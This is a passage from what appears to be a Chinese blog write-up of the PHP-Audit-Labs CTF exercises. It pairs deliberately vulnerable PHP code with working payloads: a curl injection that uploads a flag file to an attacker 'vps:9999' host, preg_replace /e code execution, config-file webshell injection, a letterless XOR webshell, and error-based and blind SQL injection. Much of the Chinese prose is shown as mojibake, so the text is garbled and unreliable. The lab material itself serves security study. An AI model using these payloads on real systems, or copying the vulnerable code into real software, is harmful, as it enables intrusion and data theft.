strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;===strtolower($urlInfo[&quot;scheme&quot;]))){            die( &quot;scheme error!&quot;);        }        $url = escapeshellarg($url);        $url = escapeshellcmd($url);        system(&quot;curl &quot;.$url);    }}?&gt;</code></pre><pre><code class="php">// flag.php&lt;?php$flag = &quot;HRCTF{Are_y0u_maz1ng}&quot;;?&gt;</code></pre><p>å¾ˆæ˜æ˜¾çš„å˜é‡è¦†ç›–ï¼Œä¹‹åè¦ç»•è¿‡wafã€‚å†æ¥ä¸‹æ¥å°±æ˜¯escapeshellsmd/argçš„æ­é…è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ã€‚<br>é¦–å…ˆè¦è§£å†³çš„æ˜¯ï¼Œæˆ‘ä»¬å¿…é¡»ç»•è¿‡preg_matchçš„é™åˆ¶æ‰èƒ½ä¼ å…¥flagå˜é‡ã€‚å› æ­¤è¦åˆ©ç”¨å¥½å®ƒå†™å¥½çš„è¿™ä¸ªåŠŸèƒ½ã€‚</p><p>é¦–å…ˆè¿™é‡Œåˆ©ç”¨äº†å¯å˜å˜é‡çš„ç‰¹æ€§ã€‚å‡è®¾æˆ‘ä»¬æäº¤</p><pre><code>?flag=test post:_GET[flag]=test</code></pre><p>å½“å¼€å§‹éå† <code>$_POST</code> è¶…å…¨å±€æ•°ç»„çš„æ—¶å€™ï¼Œ <code>$__k</code> ä»£è¡¨ _GET[flag] ï¼Œæ‰€ä»¥ <code>$$__k</code>å°±æ˜¯ <code>$_GET[flag]</code> ï¼Œå³ test å€¼ï¼Œæ­¤æ—¶ <code>$$__k == $__v</code> æˆç«‹ï¼Œå˜é‡ <code>$_GET[flag]</code> å°±è¢« unset äº†</p><p>è€Œæ¥ä¸‹æ¥ä¸‹é¢åˆæœ‰ä¸€ä¸ªå˜é‡è¦†ç›–<br><code>if($_POST) extract($_POST, EXTR_SKIP);</code><br>æ‰€ä»¥ç›´æ¥å¾—åˆ°<code>$_GET[flag]=test</code>ç»•è¿‡ç¬¬ä¸€å±‚</p><p>ç¬¬äºŒå±‚åªéœ€åˆ©ç”¨0eçš„MD5å¼±ç±»å‹æ¯”è¾ƒ<br>æœ€åæ˜¯curlçš„å‘½ä»¤æ‰§è¡Œ<br><code>http://baidu.com/&#39; -F file=@/var/www/html/flag.php -x  vps:9999</code><br>ä¼¼ä¹å½“curlç‰ˆæœ¬å˜é«˜åï¼Œå°†ä¸å†èƒ½æ‰§è¡Œã€‚<br><code>curl &#39;127.0.0.1&#39;\&#39;&#39;</code></p><h2 id="Day6"><a href="#Day6" class="headerlink" title="Day6"></a>Day6</h2><h3 id="æ­£åˆ™ä¸å½“å¯¼è‡´è·¯å¾„ç©¿è¶Š"><a href="#æ­£åˆ™ä¸å½“å¯¼è‡´è·¯å¾„ç©¿è¶Š" class="headerlink" title="æ­£åˆ™ä¸å½“å¯¼è‡´è·¯å¾„ç©¿è¶Š"></a>æ­£åˆ™ä¸å½“å¯¼è‡´è·¯å¾„ç©¿è¶Š</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/7.png" class="lazyload" data-srcset="7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ã€‚ä¸»è¦æ˜¯<code>preg_replace()</code>å‡½æ•°çš„ä½¿ç”¨ä¸å½“ã€‚å¿½ç•¥äº†<code>../../</code>è¿™ç§è·¯å¾„ã€‚å¯ä»¥ä½¿ç”¨è·¯å¾„ç©¿è¶Šè¿›è¡Œä»»æ„æ–‡ä»¶åˆ é™¤</p><h3 id="ç»ƒä¹ -5"><a href="#ç»ƒä¹ -5" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><pre><code class="php">// index.php&lt;?phpinclude &#39;flag.php&#39;;if  (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;]){    $password = $_POST[&#39;password&#39;];    if (0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password))    {        echo &#39;Wrong Format&#39;;        exit;    }    while (TRUE)    {        $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;;        if (6 &gt; preg_match_all($reg, $password, $arr))            break;        $c = 0;        $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;);        foreach ($ps as $pt)        {            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))            $c += 1;        }        if ($c &lt; 3) break;        if (&quot;42&quot; == $password) echo $flag;        else echo &#39;Wrong password&#39;;        exit;    }}highlight_file(__FILE__);?&gt;</code></pre><p>ç»ƒä¹ é‡Œçš„æ­£åˆ™å†™çš„ååˆ†ç½•è§ã€‚å…¶å®ä½¿ç”¨åˆ°çš„æ˜¯phpçš„å­—ç¬¦ç±»ã€‚é™¤äº†ä¸€çœ‹å°±æ‡‚çš„upperè¿™äº›ï¼Œå…¶ä»–çš„å­—ç¬¦ç±»çš„å«ä¹‰æ˜¯</p><pre><code>graph ç©ºæ ¼ä»¥å¤–çš„å¯æ‰“å°å­—ç¬¦punct  æ‰“å°å­—ç¬¦ï¼Œä¸åŒ…æ‹¬å­—æ¯æ•°å­—</code></pre><p>ä¸»è¦å‡½æ•°é‡Œï¼Œç¬¬ä¸€ä¸ªæ­£åˆ™è¡¨ç¤ºåŒ¹é…åˆ°å¯æ‰“å°å­—ç¬¦12ä¸ªä»¥ä¸Š;ç¬¬äºŒä¸ªæ­£åˆ™è¡¨ç¤ºæŠŠè¿ç»­çš„ç¬¦å·ã€æ•°å­—ã€å¤§å†™ã€å°å†™ï¼Œä½œä¸ºä¸€æ®µï¼Œè‡³å°‘åˆ†å…­æ®µ;ç¬¬ä¸‰ä¸ªæ­£åˆ™è¡¨ç¤ºè¾“å…¥çš„å­—ç¬¦ä¸²è‡³å°‘å«æœ‰ç¬¦å·ã€æ•°å­—ã€å¤§å†™ã€å°å†™ä¸­çš„ä¸‰ç§ç±»å‹ã€‚</p><p>æœ€åä¸æ•°å­—è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒã€‚<br>payload</p><pre><code>42.00e+00000</code></pre><p>çº¢æ—¥çš„æ–‡ç« é‡Œè¿˜æåˆ°äº†ä¸€ä¸ªé…ç½®ä¸å½“å†™shellçš„é—®é¢˜ã€‚</p><pre><code class="php">&lt;?phpif(!isset($_GET[&#39;option&#39;])) die();$str = addslashes($_GET[&#39;option&#39;]);$file = file_get_contents(&#39;./config.php&#39;);$file = preg_replace(&#39;|\$option=\&#39;.*\&#39;;|&#39;, &quot;\$option=&#39;$str&#39;;&quot;, $file);file_put_contents(&#39;./config.php&#39;, $file);</code></pre><p>è¿™ä¸ªæ˜¯ä¸å¸¦ä¿®é¥°ç¬¦æ¨¡å¼çš„æ­£åˆ™åŒ¹é….<br>ç¬¬ä¸€ç§æ–¹æ³•</p><pre><code class="php">http://127.0.0.1/index.php?option=a&#39;;%0aphpinfo();//http://127.0.0.1/index.php?option=a</code></pre><p>ç¬¬ä¸€ä¸ªpayloadå†™å…¥å†…å®¹ååªæœ‰ä¸€ä¸ªå•å¼•å·è¢«è½¬ä¹‰çš„é—®é¢˜ã€‚è€Œç¬¬äºŒéƒ¨åˆ†å†ä¼ å…¥ä¸€ä¸ªaæ—¶å°±ä¼šå› ä¸º<code>.*</code>åŒ¹é…æ— æ•°æ¬¡è€ŒæŠŠ<code>\</code>æ¢æ‰</p><p>è¿˜æœ‰ä¸¤ç§preg_replaceçš„æ–¹æ³•ã€è¿™é‡Œæä¸‹ç¬¬äºŒç§ï¼Œä¹Ÿå°±æ˜¯è¿˜é€‚ç”¨äºå•è¡Œ(éè´ªå©ª)æ¨¡å¼çš„payloadã€‚ä¹‹å‰å®‰æ’çš„å¥—å¨ƒweb2é‡Œå‡ºç°è¿‡ã€‚</p><pre><code>http://127.0.0.1/test/ph.php?option=;phpinfo();http://127.0.0.1/test/ph.php?option=$0</code></pre><p>å…¶æœ€åçš„æ•ˆæœæ˜¯ä¸‹é¢è¿™æ ·çš„</p><pre><code>&lt;?php$option=&#39;$option=&#39;;phpinfo();&#39;;&#39;;</code></pre><h2 id="Day7"><a href="#Day7" class="headerlink" title="Day7"></a>Day7</h2><h3 id="parse-str-å˜é‡è¦†ç›–"><a href="#parse-str-å˜é‡è¦†ç›–" class="headerlink" title="parse_str()å˜é‡è¦†ç›–"></a>parse_str()å˜é‡è¦†ç›–</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/8.png" class="lazyload" data-srcset="8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><blockquote><p>parse_strçš„ä½œç”¨å°±æ˜¯è§£æå­—ç¬¦ä¸²å¹¶ä¸”æ³¨å†Œæˆå˜é‡ï¼Œå®ƒåœ¨æ³¨å†Œå˜é‡ä¹‹å‰ä¸ä¼šéªŒè¯å½“å‰å˜é‡æ˜¯å¦å­˜åœ¨ï¼Œæ‰€ä»¥ä¼šç›´æ¥è¦†ç›–æ‰å½“å‰ä½œç”¨åŸŸä¸­åŸæœ‰çš„å˜é‡ã€‚</p></blockquote><p>æ‰€ä»¥æ­¤å¤„å­˜åœ¨çš„å˜é‡é—®é¢˜å°±æ˜¯<code>parse_str()</code>å¤„ç†äº†æˆ‘ä»¬å¯æ§çš„å‚æ•°å,æ˜¯å¯ä»¥èµ·åˆ°æ§åˆ¶å…¨å±€å˜é‡çš„æ•ˆæœçš„ã€‚å› æ­¤å¯ä»¥æ§åˆ¶<code>$config</code>å˜é‡åŠå…¶å¯¹åº”çš„å‚æ•°ã€‚è¾¾æˆå˜é‡è¦†ç›–ã€‚</p><p>è§£å†³è¿™ç±»å˜é‡è¦†ç›–é—®é¢˜çš„æœ€å¥½æ–¹æ³•è¿˜æ˜¯é€šè¿‡æ£€æŸ¥æŸä¸€å˜é‡æ˜¯å¦å·²ç»è®¾å®šè¿‡äº†(<code>isset()</code>)ã€‚è¿™æ ·åœ¨æ²¡æœ‰è®¾å®šè¿‡å˜é‡çš„elseåˆ†æ”¯æ‰èƒ½å®‰å…¨ä½¿ç”¨<code>parse_str()</code></p><h3 id="ç»ƒä¹ -6"><a href="#ç»ƒä¹ -6" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><pre><code class="php">//index.php&lt;?php$a = â€œhongriâ€;$id = $_GET[&#39;id&#39;];@parse_str($id);if ($a[0] != &#39;QNKCDZO&#39; &amp;&amp; md5($a[0]) == md5(&#39;QNKCDZO&#39;)) {    echo &#39;&lt;a href=&quot;uploadsomething.php&quot;&gt;flag is here&lt;/a&gt;&#39;;}?&gt;</code></pre><pre><code class="php">//uploadsomething.php&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);$referer = $_SERVER[&#39;HTTP_REFERER&#39;];if(isset($referer)!== false) {    $savepath = &quot;uploads/&quot; . sha1($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;/&quot;;    if (!is_dir($savepath)) {        $oldmask = umask(0);        mkdir($savepath, 0777);        umask($oldmask);    }    if ((@$_GET[&#39;filename&#39;]) &amp;&amp; (@$_GET[&#39;content&#39;])) {        //$fp = fopen(&quot;$savepath&quot;.$_GET[&#39;filename&#39;], &#39;w&#39;);        $content = &#39;HRCTF{y0u_n4ed_f4st}   by:l1nk3r&#39;;        file_put_contents(&quot;$savepath&quot; . $_GET[&#39;filename&#39;], $content);        $msg = &#39;Flag is here,come on~ &#39; . $savepath . htmlspecialchars($_GET[&#39;filename&#39;]) . &quot;&quot;;        usleep(100000);        $content = &quot;Too slow!&quot;;        file_put_contents(&quot;$savepath&quot; . $_GET[&#39;filename&#39;], $content);    }   print &lt;&lt;&lt;EOT&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;&lt;div class=&quot;form-group&quot;&gt;&lt;label for=&quot;exampleInputEmail1&quot;&gt;Filename&lt;/label&gt;&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;filename&quot; id=&quot;exampleInputEmail1&quot; placeholder=&quot;Filename&quot;&gt;&lt;/div&gt;&lt;div class=&quot;form-group&quot;&gt;&lt;label for=&quot;exampleInputPassword1&quot;&gt;Content&lt;/label&gt;&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;content&quot; id=&quot;exampleInputPassword1&quot; placeholder=&quot;Contont&quot;&gt;&lt;/div&gt;&lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Submit&lt;/button&gt;&lt;/form&gt;EOT;}else{    echo &#39;you can not see this page&#39;;}?&gt;</code></pre><p>ç¬¬ä¸€éƒ¨åˆ†æ˜¯ä¸€ä¸ªæ¯”è¾ƒåˆ»æ„çš„<code>parse_str()</code>å˜é‡è¦†ç›–çš„ç”¨ä¾‹ã€‚åªè¦è§£å†³md5å¼±ç±»å‹æ¯”è¾ƒçš„é—®é¢˜å°±å¥½äº†</p><pre><code>?id=a[0]=s878926199a </code></pre><p>ç¬¬äºŒéƒ¨åˆ†å…ˆæ˜¯æ³¨æ„ä¸€ä¸ªrefererå¤´è¦å¸¦ä¸Šã€‚ä¹‹åå°±æ˜¯ä¸€ä¸ªè¯»flagçš„é—®é¢˜äº†ã€‚å› ä¸ºflagçš„å†…å®¹ä¼šåœ¨æŒ‚èµ·0.1sç„¶åè¢«æ›¿æ¢æ‰ã€‚æ‰€ä»¥éœ€è¦æˆ‘ä»¬å»æ¡ä»¶ç«äº‰ã€‚å½“ç„¶è¿™é‡Œä¸Šä¼ ç›®å½•æ˜¯å›ºå®šçš„ã€‚æ‰€ä»¥å°±å¯ä»¥æ”¾å¿ƒå‘åŒ…äº†ã€‚</p><h2 id="Day8"><a href="#Day8" class="headerlink" title="Day8"></a>Day8</h2><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/9.png" class="lazyload" data-srcset="9.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™æ˜¯ä¸€ä¸ªè‡ªå·±åˆšäº†è§£CTFä¸ä¹…æ—¶æ¥è§¦çš„ä¸€ä¸ª<code>preg_replace()</code>åœ¨<code>/e</code>ä¸‹å­˜åœ¨ä»£ç æ‰§è¡Œçš„æ¼æ´äº†ã€‚å½“ç„¶è¿™ä¸ªæ´æ˜¯php5.5ç‰ˆæœ¬çš„</p><p>æˆ‘ä»¬çš„å‚æ•°å¯ä»¥æ§åˆ¶preg_replaceçš„ç¬¬ä¸€ï¼Œä¸‰ä¸ªå‚æ•°ã€‚è¾¾æˆä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p>ç„¶åå½“æ—¶ä¹Ÿæ˜¯è¯»åˆ°ä¸€ç¯‡æ–‡ç« ä¸“é—¨è®²åˆ°è¿™é‡Œpayloadçš„æ„é€ <br>åŸæœ¬å®˜æ–¹çš„payload</p><pre><code>/?.*={${phpinfo()}}</code></pre><p>å¦‚æœGETè¯·æ±‚çš„å‚æ•°åå­˜åœ¨éæ³•å­—ç¬¦ï¼ŒPHPä¼šå°†å…¶æ›¿æ¢æˆä¸‹åˆ’çº¿ï¼Œå³<code>.*</code> ä¼šå˜æˆ <code>_*</code><br>è€Œå®é™…å¯è¡Œçš„payload</p><pre><code>\S*=${phpinfo()} </code></pre><h3 id="ç»ƒä¹ -7"><a href="#ç»ƒä¹ -7" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><pre><code class="php">// index.php&lt;?phpinclude &#39;flag.php&#39;;if(isset($_GET[&#39;code&#39;])){    $code=$_GET[&#39;code&#39;];    if(strlen($code)&gt;40){        die(&quot;Long.&quot;);    }    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){        die(&quot;NO.&quot;);    }    @eval($code);}else{    highlight_file(__FILE__);}highlight_file(__FILE);// $hint = &quot;php function getFlag() to get flag&quot;;?&gt;</code></pre><pre><code class="php">// index2.php&lt;?phpinclude &#39;flag.php&#39;;if(isset($_GET[&#39;code&#39;])){    $code=$_GET[&#39;code&#39;];    if(strlen($code)&gt;50){        die(&quot;Too Long.&quot;);    }    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code)){        die(&quot;Not Allowed.&quot;);    }    @eval($code);}else{    highlight_file(__FILE__);}highlight_file(__FILE);// $hint = &quot;php function getFlag() to get flag&quot;;?&gt; </code></pre><p>å·²ç»å¸ç©ºè§æƒ¯çš„æ— æ•°å­—å­—æ¯webshellä¹¦å†™äº†</p><p>ç•™ä¸€ä¸ªFUZZè„šæœ¬</p><pre><code class="php">&lt;?php$a = str_split(&#39;getFlag&#39;);for($i = 0; $i &lt; 256; $i++){    $ch = &#39;{&#39;^ chr($i);    if (in_array($ch, $a , true)) {        echo &quot;{ ^ chr(&quot;.$i.&quot;) = $ch&lt;br&gt;&quot;;    }}echo &quot;{{{{{{{"^chr(28).chr(30).chr(15).chr(61).chr(23).chr(26).chr(28);?>```payload1```$_="{{{{{{{"^"%1c%1e%0f%3d%17%1a%1c";$_();```payload2```$å“¼="{{{{{{{"^"%1c%1e%0f%3d%17%1a%1c";$å“¼();```ä¸Šæ¬¡åš36dçš„æŸé“é¢˜è‡ªå·±ç”¨äº†æœ€æé™çš„æ— æ•°å­—å­—æ¯ä¸”ä¸èƒ½å¼‚æˆ–å–åçš„webshellã€‚ä¹Ÿå°±æ˜¯é€šé…ç¬¦åŠ ä¸Šphpä¸´æ—¶æ–‡ä»¶å‘½ä»¤æ‰§è¡Œã€‚é‚£ä¸ªåº”è¯¥ç®—æ˜¯æ¯”è¾ƒéš¾ç”¨çš„ï¼Œä½†å¯ä»¥è§£å†³å¤§éƒ¨åˆ†wafäº†## Day9### str_replace()è¿‡æ»¤ä¸å½“![](10.png)ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„è¿‡æ»¤å‡½æ•°é—®é¢˜ã€‚å®ƒåªæ˜¯å°†`../`æ›¿æ¢ä¸ºç©ºã€‚é‚£ä¹ˆå¾ˆå®¹æ˜“å°±èƒ½ä½¿ç”¨`....//`è¿›è¡ŒåŒå†™ç»•è¿‡ç„¶åå°±æ˜¯`require_once()`çš„æ–‡ä»¶åŒ…å«äº†ã€‚CMSå®ä¾‹å°±æ˜¯é€ æˆè·¯å¾„ç©¿è¶Š,å¾—åˆ°ä»»æ„æ–‡ä»¶è¯»å–ã€‚å½“ç„¶åŒå†™/urläºŒæ¬¡ç¼–ç è¿›è¡Œè·¯å¾„ç©¿è¶Šçš„æŠ€å·§å…¶å®ä¹Ÿç®—å¾ˆå¸¸è§äº†ã€‚### ç»ƒä¹ ```php/ index.php<?php  include 'config.php';include 'function.php';$conn = new mysqli($servername,$username,$password,$dbname);if($conn->connect_error){    die('è¿æ¥æ•°æ®åº“å¤±è´¥');}$sql = "SELECT COUNT(*) FROM users";$result = $conn->query($sql);if($result->num_rows > 0){    $row = $result->fetch_assoc();    $id = $row['COUNT(*)'] + 1;}else die($conn->error);if(isset($_POST['msg']) && $_POST['msg'] !==''){    $msg = addslashes($_POST['msg']);    $msg = replace_bad_word(convert($msg));    $sql = "INSERT INTO users VALUES($id,'".$msg."')";    $result = $conn->query($sql);    if($conn->error) die($conn->error);}echo "<center><h1>Welcome come to HRSEC message board</h1></center>";echo <<<EOF <center>    <form action="index.php" method="post">        <p>Leave a message: <input type="text" name="msg"><input type="submit" value="Submit"></p>    </form>EOF;$sql = "SELECT * FROM users";$result = $conn->query($sql);if($result->num_rows > 0){    echo "<center><table border="1"><tr><th>id</th><th>message</th></tr><tr></tr></table></center>";    while($row = $result->fetch_row()){        echo "<tr><th>$row[0]</th><th>$row[1]</th></tr><tr>";    }    echo "";}$conn->close();?>``````php// function.php<?php  function replace_bad_word($str){    global $limit_words;    foreach ($limit_words as $old => $new) {        strlen($old) > 2 && $str = str_replace($old,trim($new),$str);    }    return $str;}function convert($str){    return htmlentities($str);}$limit_words = array('é€ å' => 'é€ **', 'æ³•è½®åŠŸ' => 'æ³•**');foreach (array('_GET','_POST') as $method) {    foreach ($$method as $key => $value) {        $$key = $value;    }}?>```// config.php```php<?php  $servername = "localhost";$username = "hongrisec";$password = "hongrisec";$dbname = "day9";?># æ­å»ºCTFç¯å¢ƒä½¿ç”¨çš„sqlè¯­å¥create database day9;use day9;create table users(id integer auto_increment not null primary key,message varchar(50));create table flag( flag varchar(40));insert into flag values('HRCTF{StR_R3p1ac3_anD_sQ1_inJ3ctIon_zZz}');```å¯æ§çš„msgå˜é‡è¢«æ‹¼æ¥è¿›sqlè¯­å¥ã€‚ä½†æ˜¯å´ç»è¿‡äº†htmlå®ä½“ç¼–ç ,è½¬ä¹‰,è¿‡æ»¤ä¸ªåˆ«è¯çš„æ“ä½œã€‚ä¸è¿‡,åœ¨function.phpå´å­˜åœ¨å¾ˆæ˜æ˜¾çš„å˜é‡è¦†ç›–æ¼æ´ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡è¦†ç›–`$limit_words`æ•°ç»„ï¼Œæ¥é€ƒé€¸å•å¼•å·.æœ€åpayload```1%00' and updatexml(1,concat(0x7e,(select flag from flag),0x7e),1))#&limit_words[\0\]=1%00' and updatexml(1,concat(0x7e,(select reverse(flag) from flag),0x7e),1))#&limit_words[\0\]=```## Day10###  ç¨‹åºåˆ¤é”™æœªexit()![](11.png)è¿™é‡Œçš„é—®é¢˜ä¸»è¦æ˜¯:ä»£ç è™½ç„¶æœ‰ç›¸åº”çš„é˜²å¾¡æ“ä½œï¼Œä½†æ˜¯ç¨‹åºæœªç«‹å³åœæ­¢é€€å‡ºï¼Œå¯¼è‡´ç¨‹åºç»§ç»­æ‰§è¡Œçš„é—®é¢˜æ­¤å¤„`extract()`å¾—åˆ°äº†ä¸€ä¸ªå˜é‡è¦†ç›–çš„åˆ©ç”¨åŠ ä¸Š`assert()`ï¼Œæ‰€ä»¥piå˜é‡ç›´æ¥ç»™webshellä»£ç å³å¯æˆ‘ä¸ªäººä¸€æ¬¡ä½“éªŒæ¯”è¾ƒæ·±çš„ç»å†æ˜¯:åœ¨htbçš„æŸä¸ªé¶æœºä¸­ã€‚æœ‰ä¸€å¤„phpä»£ç ä¸­æ›¾ç»é™å®šåªæœ‰æŒ‡å®šç”¨æˆ·è®¿é—®(æ£€æŸ¥session),æ‰ä¼šæ˜¾ç¤ºå…¶sshå¯†é’¥ã€‚è€Œæ­¤æ—¶æˆ‘ä»¬çš„æƒé™æ˜¯www-data.çœ‹ä¼¼æ— æ³•è·å¾—sshå¯†é’¥,ä½†æ˜¯å…¶ä»£ç ä¸­å‡ºç°äº†ç–å¿½,åœ¨å¯¹userçš„sessionåˆ¤åˆ«åæ²¡æœ‰ç«‹å³`exit()`.é‚£ä¹ˆå½“æˆ‘ä»¬ä»¥www-dataç›´æ¥æœ¬åœ°curlè¿™ä¸€ç½‘é¡µæ—¶,å°†å¯ä»¥å¾—åˆ°å¯†é’¥,è¿›è€Œææƒã€‚### ç»ƒä¹ ```php// index.php<?phpinclude 'config.php';function stophack($string){    if(is_array($string)){        foreach($string as $key => $val) {            $string[$key] = stophack($val);        }    }    else{        $raw = $string;        $replace = array("\\","\"","'","/","*","%5C","%22","%27","%2A","~","insert","update","delete","into","load_file","outfile","sleep",);        $string = str_ireplace($replace, "HongRi", $string);        $string = strip_tags($string);        if($raw!=$string){            error_log("Hacking attempt.");            header('Location: /error/');        }        return trim($string);    }}$conn = new mysqli($servername, $username, $password, $dbname);if ($conn->connect_error) {    die("è¿æ¥å¤±è´¥: ");}if(isset($_GET['id']) && $_GET['id']){    $id = stophack($_GET['id']);    $sql = "SELECT * FROM students WHERE id=$id";    $result = $conn->query($sql);    if($result->num_rows > 0){        $row = $result->fetch_assoc();        echo '<center><h1>æŸ¥è¯¢ç»“æœä¸ºï¼š</h1><pre>'.<<<EOF +----+---------+--------------------+-------+ | id name email score {$row['id']} {$row['name']} {$row['email']} {$row['score']} +----+---------+--------------------+-------+< center>EOF;    }}else die("ä½ æ‰€æŸ¥è¯¢çš„å¯¹è±¡idå€¼ä¸èƒ½ä¸ºç©ºï¼");?>```æ˜¾ç„¶,ç¨‹åºå¦‚æœæ£€æµ‹åˆ°éæ³•å­—ç¬¦æˆ–å•è¯ï¼Œéƒ½ä¼šå°†å…¶æ›¿æ¢æˆå­—ç¬¦ä¸² HongRi ï¼Œç„¶è€Œå¹¶æ²¡æœ‰ç«‹å³é€€å‡ºï¼Œè¿™æ ·æ”»å‡»è€…è¾“å…¥çš„æ”»å‡»è¯­å¥è¿˜æ˜¯ä¼šç»§ç»­è¢«å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚åªä¸è¿‡è¿™é‡Œå…³é”®è¯éƒ½è¢«æ›¿æ¢æˆäº†å­—ç¬¦ä¸² HongRiç®€å•çš„ä½¿ç”¨benchmarkæ›¿æ¢sleepå³å¯ç›²æ³¨```-1 or if(ascii(mid((select flag from flag),1,1))=115,benchmark(200000000,7^3^8),0)```## Day11### phpååºåˆ—åŒ–![](12.png)(ç¬¬11è¡Œæ­£åˆ™è¡¨è¾¾å¼åº”æ”¹ä¸ºï¼š'/O:\d:/')é¦–å…ˆç¡®è®¤äº†å­˜åœ¨ååºåˆ—åŒ–ã€‚ä¸”æ•°æ®æ˜¯cookieå¯æ§ã€‚é‚£ä¹ˆè€ƒè™‘ä¸‹ç»•è¿‡æ‰§è¡Œååºåˆ—åŒ–ã€‚é‚£ä¹ˆçœ‹ä¸‹loaddataé‡Œçš„é™åˆ¶å¼€å¤´ä¸èƒ½æ˜¯`O:`,å³ååºåˆ—åŒ–å†…å®¹ä¸ä¸ºå¯¹è±¡åŒæ—¶éœ€è¦ä¸èƒ½åŒ¹é…å­—ç¬¦ä¸²ä¸º`O:ä»»æ„åè¿›åˆ¶:`å¦‚æœåªæ˜¯ç¬¬ä¸€éƒ¨åˆ†å½“ç„¶å¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ã€‚ä½†æ˜¯è¿™æ ·ç¬¬äºŒéƒ¨åˆ†è¿˜æ˜¯ä¼šåŒ¹é…åˆ°æ•°ç»„ä¸­çš„å¯¹è±¡æˆåˆ†ã€‚è¿™é‡Œç”¨åˆ°çš„æ˜¯ä¸€ä¸ªæ¯”è¾ƒè€çš„ç»•è¿‡æ–¹æ³•äº†ã€‚å³ä½¿ç”¨`O:+`ç»•è¿‡ã€‚è€ŒåŸç†å¯ä»¥æ¶‰åŠåˆ°åº•å±‚æºç ã€‚å‡½æ•°é‡åˆ°`+`å·æ—¶ä¼šç»§ç»­å‘ä¸‹åˆ¤æ–­ï¼Œå› æ­¤å¯ä»¥æ­£å¸¸ååºåˆ—åŒ–ã€‚æœ€åå°±èƒ½æˆåŠŸæ‰§è¡Œå†™æ–‡ä»¶webshelläº†ã€‚### ç»ƒä¹  ```php <?phpinclude "config.php";class HITCON{    public $method;    public $args;    public $conn;    function __construct($method, $args) {        $this->method = $method;        $this->args = $args;        $this->__conn();    }    function __conn() {        global $db_host, $db_name, $db_user, $db_pass, $DEBUG;        if (!$this->conn)            $this->conn = mysql_connect($db_host, $db_user, $db_pass);        mysql_select_db($db_name, $this->conn);        if ($DEBUG) {            $sql = "DROP TABLE IF  EXISTS  users";            $this->__query($sql, $back=false);            $sql = "CREATE TABLE IF NOT EXISTS users (username VARCHAR(64),            password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8";            $this->__query($sql, $back=false);            $sql = "INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')";            $this->__query($sql, $back=false);        }        mysql_query("SET names utf8");        mysql_query("SET sql_mode = 'strict_all_tables'");    }    function __query($sql, $back=true) {        $result = @mysql_query($sql);        if ($back) {            return @mysql_fetch_object($result);        }    }      function login() {        list($username, $password) = func_get_args();        $sql = sprintf("SELECT * FROM users WHERE username='%s' AND password='%s'", $username, md5($password));        $obj = $this->__query($sql);        if ( $obj != false ) {            define('IN_FLAG', TRUE);            $this->loadData($obj->role);        }        else {          $this->__die("sorry!");        }    }    function loadData($data) {        if (substr($data, 0, 2) !== 'O:' && !preg_match('/O:\d:/', $data)) {            return unserialize($data);        }        return [];    }      function __die($msg) {        $this->__close();        header("Content-Type: application/json");        die( json_encode( array("msg"=> $msg) ) );    }    function __close() {        mysql_close($this->conn);    }    function source() {        highlight_file(__FILE__);    }    function __destruct() {        $this->__conn();        if (in_array($this->method, array("login", "source"))) {            @call_user_func_array(array($this, $this->method), $this->args);        }        else 